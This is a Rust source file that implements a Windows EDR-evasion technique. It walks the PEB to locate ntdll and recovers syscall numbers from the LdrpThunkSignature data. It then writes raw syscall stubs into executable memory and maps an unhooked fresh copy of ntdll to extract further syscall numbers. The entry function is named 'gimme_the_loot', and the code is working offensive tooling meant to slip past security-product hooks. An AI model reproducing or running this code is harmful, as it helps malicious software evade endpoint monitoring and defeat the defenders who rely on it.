use std::{
    str,
    ptr::{null_mut, copy_nonoverlapping},
    ffi::CStr, collections::BTreeMap,
    os::raw::c_char,
};

use bstr::ByteSlice;

use std::mem::{size_of, zeroed, transmute};

use winapi::{
    um::{
        processthreadsapi::{GetCurrentProcess},
        handleapi::{CloseHandle},
        winnt::{IMAGE_DOS_SIGNATURE, PIMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE, PIMAGE_NT_HEADERS, 
            PIMAGE_SECTION_HEADER, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE, ACCESS_MASK, 
            FILE_READ_DATA, FILE_SHARE_READ, SECTION_ALL_ACCESS, PAGE_READONLY, SEC_COMMIT, IMAGE_EXPORT_DIRECTORY, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64},
        memoryapi::{VirtualAlloc},
    },
    shared::{
        ntdef::{NT_SUCCESS, HANDLE, PVOID, UNICODE_STRING, InitializeObjectAttributes, OBJECT_ATTRIBUTES, POBJECT_ATTRIBUTES, NTSTATUS, PHANDLE, PLARGE_INTEGER, OBJ_CASE_INSENSITIVE},
        minwindef::{ULONG}, basetsd::{ULONG_PTR, SIZE_T, PSIZE_T},
    },
    ctypes::{c_void},
};

use ntapi::{
    ntpsapi::{PROCESS_BASIC_INFORMATION, NtQueryInformationProcess, PPEB_LDR_DATA},
    ntpebteb::{PPEB},
    ntldr::{PLDR_DATA_TABLE_ENTRY},
    ntrtl::RtlInitUnicodeString, ntioapi::{IO_STATUS_BLOCK, PIO_STATUS_BLOCK}, ntmmapi::SECTION_INHERIT,
};


type NtOpenFile = unsafe extern "system" fn(
    FileHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK, 
    ObjectAttributes: POBJECT_ATTRIBUTES, 
    IoStatusBlock: PIO_STATUS_BLOCK, 
    ShareAccess: ULONG, 
    OpenOptions: ULONG
) -> NTSTATUS;

type NtCreateSection = unsafe extern "system" fn(
    SectionHandle: PHANDLE, 
    DesiredAccess: ACCESS_MASK, 
    ObjectAttributes: POBJECT_ATTRIBUTES, 
    MaximumSize: PLARGE_INTEGER, 
    SectionPageProtection: ULONG, 
    AllocationAttributes: ULONG, 
    FileHandle: HANDLE
) -> NTSTATUS;

type NtMapViewOfSection = unsafe extern "system" fn(
    SectionHandle: HANDLE, 
    ProcessHandle: HANDLE, 
    BaseAddress: *mut PVOID, 
    ZeroBits: ULONG_PTR, 
    CommitSize: SIZE_T, 
    SectionOffset: PLARGE_INTEGER, 
    ViewSize: PSIZE_T, 
    InheritDisposition: SECTION_INHERIT, 
    AllocationType: ULONG, 
    Win32Protect: ULONG
) -> NTSTATUS;

//For VirtualAlloc
const MAX_SYSCALL_STUB_SIZE: u32 = 64;


/// Gets the Process Environment Block Address (PEB)
unsafe fn get_peb_address() -> PPEB {
    let mut basic_information: PROCESS_BASIC_INFORMATION = zeroed();
    
    let process_handle: HANDLE = GetCurrentProcess();
    let status = NtQueryInformationProcess(process_handle, 0, 
        &mut basic_information as *mut _ as *mut c_void, 
        size_of::<PROCESS_BASIC_INFORMATION>() as u32, null_mut());   
        
    if !NT_SUCCESS(status) {
        CloseHandle(process_handle);
        panic!("NtQueryInformationProcess: failed to retrieves information about the specified process");
    }

    return basic_information.PebBaseAddress;
}

/// Retrieves the specified module from the local process
unsafe fn get_module_by_name(module_name: &str) -> PVOID  {
    let peb_ptr: PPEB = get_peb_address();
    
    let mut dll_base = null_mut();
    
    let ptr_peb_ldr_data = transmute::<*mut _, PPEB_LDR_DATA>((*peb_ptr).Ldr);
    let mut module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*ptr_peb_ldr_data).InLoadOrderModuleList.Flink);

    while !(*module_list).DllBase.is_null() {
        let dll_name = (*module_list).BaseDllName.Buffer;

        if is_equal(dll_name, module_name.len(), module_name) {
            dll_base = (*module_list).DllBase;
            break;
        }
        module_list = transmute::<*mut _, PLDR_DATA_TABLE_ENTRY>((*module_list).InLoadOrderLinks.Flink);
    }

    return dll_base;
}

/// Retrieves the NT headers of the specified module
unsafe fn get_nt_headers(module_base: PVOID) -> PIMAGE_NT_HEADERS {
    let dos_header = transmute::<*mut _, PIMAGE_DOS_HEADER>(module_base);

    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return null_mut();
    }

    let nt_headers = transmute::<usize, PIMAGE_NT_HEADERS>(module_base as usize + (*dos_header).e_lfanew as usize);

    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return null_mut();
    }

    nt_headers
}

/// Retrieves the specified section of the specified module base address
unsafe fn get_sections_header(module_base: PVOID, nt_headers: PIMAGE_NT_HEADERS, section_type: &[u8]) -> (*const u32, &u32) {
    
    let nt_headers = &*nt_headers;

    let section_header = ((&nt_headers.OptionalHeader as *const _ as usize) 
        + (nt_headers.FileHeader.SizeOfOptionalHeader as usize)) as PIMAGE_SECTION_HEADER;

    let mut data_section_address = 0 as *const u32;
    let mut data_section_size = &0;

    for i in 0..(*nt_headers).FileHeader.NumberOfSections {
        let section_header_i = &*(section_header.add(i as usize));

        let null_byte = section_header_i.Name.iter().position(|c| *c == b'\0').unwrap_or(section_header_i.Name.len());
        let section_name = &section_header_i.Name[..null_byte];
        
        if section_name == section_type {
            data_section_address = (module_base as usize + section_header_i.VirtualAddress as usize) as *const u32;
            data_section_size = section_header_i.Misc.VirtualSize();
            break;
        }
    }

    return (data_section_address, data_section_size);
}

/// Retrieves syscalls from LdrpThunkSignature in the .data section
unsafe fn get_syscalls_from_ldrp_thunk_signature(data_section_address: *const u32, data_section_size: &u32) -> Vec<*mut c_void> {
    let mut syscall_ntopenfile: u32 = 0;
    let mut syscall_ntcreatesection: u32 = 0;
    let mut syscall_ntmapviewofsection: u32 = 0;

    if (*data_section_address) == 0 || data_section_size < &(16 * 5) {
        panic!(".data section base address is null or .data section size is less than 80");
    }

    let section_size = (data_section_size - &(16 * 5)) as isize;
    
    for offset in 0..section_size {

        // Have to divide by 4 because using .offset on a pointer is indexing an array 4 bytes at a time.
        if data_section_address.offset(offset).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (16 / 4)).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (32 / 4)).read() == 0xb8d18b4c 
        && data_section_address.offset(offset + (48 / 4)).read() == 0xb8d18b4c
        && data_section_address.offset(offset + (64 / 4)).read() == 0xb8d18b4c
        {
            syscall_ntopenfile = data_section_address.offset(offset + (4 / 4)).read() as u32;
            syscall_ntcreatesection = data_section_address.offset(offset + (16 + 4) / 4).read() as u32;
            syscall_ntmapviewofsection = data_section_address.offset(offset + (64 + 4) / 4).read() as u32;
            println!("\n[+] Found NtOpenFile Syscall Number: {:#x}", syscall_ntopenfile);
            println!("[+] Found NtCreateSection Syscall Number: {:#x}", syscall_ntcreatesection);
            println!("[+] Found NtMapViewOfSection Syscall Number: {:#x}", syscall_ntmapviewofsection);
            break;
        }
    }
    
    if syscall_ntopenfile == 0 && syscall_ntcreatesection == 0 && syscall_ntmapviewofsection == 0 {
        panic!("Failed to find system calls for NtOpenFile, NtCreateSection or NtMapViewOfSection");
    }
    
    //Not optimal from an opsec perspective
    let syscall_region = VirtualAlloc(null_mut(), (3 * MAX_SYSCALL_STUB_SIZE) as usize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) as usize;

    if syscall_region == 0 {
        panic!("Failed to allocate memory using VirtualAlloc");
    }

    let nt_open_file = build_syscall_stub(syscall_region as *mut c_void, syscall_ntopenfile);
    let nt_create_section = build_syscall_stub((syscall_region + MAX_SYSCALL_STUB_SIZE as usize) as *mut c_void, syscall_ntcreatesection);
    let nt_map_view_of_section = build_syscall_stub((syscall_region + (2 * MAX_SYSCALL_STUB_SIZE as usize)) as *mut c_void, syscall_ntmapviewofsection);

    let system_calls = vec![nt_open_file, nt_create_section, nt_map_view_of_section];
    
    return system_calls;
}

/// Builds system calls for the specfied syscall number in the specfied region of memory
pub unsafe fn build_syscall_stub(stub_region: *mut c_void, syscall_number: u32) -> *mut c_void {
    let mut syscall_stub: Vec<u8> = vec![
        0x4c, 0x8b, 0xd1,               // mov r10, rcx
        0xb8, 0x00, 0x00, 0x00, 0x00,   // mov eax, xxx
        0x0f, 0x05,                     // syscall
        0xc3                            // ret
        ];

    syscall_stub[4] = syscall_number as u8;

    copy_nonoverlapping(syscall_stub.as_ptr(), stub_region as _, syscall_stub.len());

    return stub_region;
}


/// Loads a unhooked fresh copy of NTDLL into the current process
unsafe fn load_ntdll_into_section(syscalls: Vec<*mut c_void>) -> *mut c_void {
    let mut file_name: UNICODE_STRING = zeroed::<UNICODE_STRING>();
    let ntdll_path = "\\??\\C:\\Windows\\System32\\ntdll.dll";

    let mut unicode_ntdll_path: Vec<_> =  ntdll_path.encode_utf16().collect();
    unicode_ntdll_path.push(0x0);
    RtlInitUnicodeString(&mut file_name, unicode_ntdll_path.as_ptr());

    let mut object_attributes: OBJECT_ATTRIBUTES = zeroed::<OBJECT_ATTRIBUTES>();

    InitializeObjectAttributes(&mut object_attributes, &mut file_name, OBJ_CASE_INSENSITIVE, null_mut(), null_mut());

    let ptr_nt_open_file = syscalls[0] as usize;
    let ptr_nt_create_section = syscalls[1] as usize;
    let ptr_nt_map_view_of_section = syscalls[2] as usize;

    let syscall_nt_open_file = transmute::<_, NtOpenFile>(ptr_nt_open_file);
    let syscall_nt_create_section = transmute::<_, NtCreateSection>(ptr_nt_create_section);
    let nt_map_view_of_section = transmute::<_, NtMapViewOfSection>(ptr_nt_map_view_of_section);

    let mut file_handle: HANDLE = null_mut();
    let mut io_status_block: IO_STATUS_BLOCK = zeroed();

    let mut section_handle = null_mut();
    let mut lp_section: *mut c_void = null_mut();
    let mut view_size: usize = 0;
    
    let status = syscall_nt_open_file(&mut file_handle, FILE_READ_DATA, &mut object_attributes, &mut io_status_block, FILE_SHARE_READ, 0);

    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("Failed to call NtOpenFile: {:?}", status);
    }

    let status = syscall_nt_create_section(&mut section_handle, SECTION_ALL_ACCESS, null_mut(), null_mut(), PAGE_READONLY, SEC_COMMIT, file_handle);

    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("Failed to call NtCreateSection: {:?}", status);
    }
    
    let status = nt_map_view_of_section(section_handle, GetCurrentProcess(), &mut lp_section as *mut _ as *mut _, 0, 0, null_mut(), &mut view_size, 1, 0, PAGE_READONLY);
    
    if !NT_SUCCESS(status) {
        close_handles(section_handle, file_handle, lp_section);
        panic!("Failed to call NtMapViewOfSection: {:?}", status);
    }

    close_handles(section_handle, file_handle, lp_section);

    return lp_section;
}

/// Closes created handled
unsafe fn close_handles(section_handle: HANDLE, file_handle: HANDLE, lp_section: *mut c_void) {
    CloseHandle(section_handle);
    CloseHandle(file_handle);
    CloseHandle(lp_section);
}

/// Compares a UNICODE_STRING (*mut 16) with a slice and returns true if equal
fn is_equal(pointer: *mut u16, length: usize, against: &str) -> bool {
    // Create slice not including the null-terminator
    let slice = unsafe { std::slice::from_raw_parts(pointer, length - 1) };
    slice.iter().zip(against.encode_utf16()).all(|(a, b)| *a == b)
}

/// Gets user input from the terminal
/*
fn get_input() -> io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

/// Used for debugging
fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
*/

/// Retrieves all function and addresses from the specfied modules
unsafe fn get_module_exports(module_base: *mut c_void) -> BTreeMap<String, usize> {
    let mut exports = BTreeMap::new();
    let dos_header = *(module_base as *mut IMAGE_DOS_HEADER);

    if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
        panic!("Error: get_module_exports failed, DOS header is invalid");
    }
    
    let nt_header =
        (module_base as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        panic!("Error: get_module_exports failed, NT header is invalid");
    }

    let export_directory = (module_base as usize
        + (*nt_header).OptionalHeader.DataDirectory
            [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress as usize)
        as *mut IMAGE_EXPORT_DIRECTORY;

    let names = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNames as usize)
            as *const u32,
        (*export_directory).NumberOfNames as _,
    );
    
    let functions = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfFunctions as usize)
            as *const u32,
        (*export_directory).NumberOfFunctions as _,
    );
    
    let ordinals = core::slice::from_raw_parts(
        (module_base as usize + (*export_directory).AddressOfNameOrdinals as usize)
            as *const u16,
        (*export_directory).NumberOfNames as _,
    );

    println!("[+] Module Base: {:?} Export Directory: {:?} AddressOfNames: {names:p}, AddressOfFunctions: {functions:p}, AddressOfNameOrdinals: {ordinals:p} ", module_base, export_directory);

    for i in 0..(*export_directory).NumberOfNames {
        
        let name = (module_base as usize + names[i as usize] as usize) as *const c_char;

        if let Ok(name) = CStr::from_ptr(name).to_str() {
            
            let ordinal = ordinals[i as usize] as usize;

            exports.insert(
                name.to_string(),
                module_base as usize + functions[ordinal] as usize,
            );
        }
    }  
    exports
}

/// Extracts the system call number from the specfied function pointer
fn find_bytes(function_ptr: usize) -> usize {    
    let stub: &'static [u8] = &[0x4c, 0x8b, 0xd1, 0xb8];

    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(function_ptr as *const u8, 5) };

    let syscall: Option<u8> = func_slice.find(stub).map(|idx| func_slice[idx + stub.len()]);

    match syscall {
        Some(syscall_number) => return syscall_number as usize,
        None => println!("System call number not found"),
    }

    return 0;
}

pub fn gimme_the_loot(dll_name: &str) -> *mut c_void {

    let section_type = b".data";

    // Get NTDLL's base address for the current process
    let module_base = unsafe { get_module_by_name(dll_name) };
    println!("[+] Module Base Address: {:?}", module_base);

    // Get NT Headers for NTDLL
    let nt_headers =  unsafe { get_nt_headers(module_base) };
    println!("[+] NT Headers Base Address: {:?}", nt_headers);

    // Get the .data section for NTDLL
    let (section_base, section_size) = unsafe { get_sections_header(module_base, nt_headers, section_type) };
    println!("[+] Section Header Base Address: {:?} Section Size: {:?}", section_base as *mut c_void, section_size);

    // Get the system calls for NtOpenFile, NtCreateSection, NtMapViewOfSection from LdrpThunkSignature
    let syscalls_memory_regions = unsafe { get_syscalls_from_ldrp_thunk_signature(section_base, section_size) } ;
    println!("\n[+] System call stub memory region: {:?}\n", syscalls_memory_regions);
    
    // Load an unhooked fresh copy of NTDLL from disk using the system calls from LdrpThunkSignature
    let ptr_ntdll = unsafe { load_ntdll_into_section(syscalls_memory_regions) };
    println!("[+] Pointer to Fresh Copy of NTDLL: {:?}" , ptr_ntdll);

    return ptr_ntdll;
}

pub fn get_function_address(ptr_ntdll: *mut c_void, function_to_call: &str) -> usize {
    let mut function_ptr = 0;
    
    //Get the names and addresses of functions in NTDLL
    for (name, addr) in unsafe { get_module_exports(ptr_ntdll) } {
        if name.starts_with(function_to_call) {
            println!("[+] Function: {:?} Address {:#x}", name, addr);
            function_ptr = addr;
        }
    }

    // Get syscalls from the unhooked fresh copy of NTDLL
    let system_call_number = find_bytes(function_ptr);
    println!("[+] Syscall Number: {:#x}", system_call_number);

    return system_call_number;
}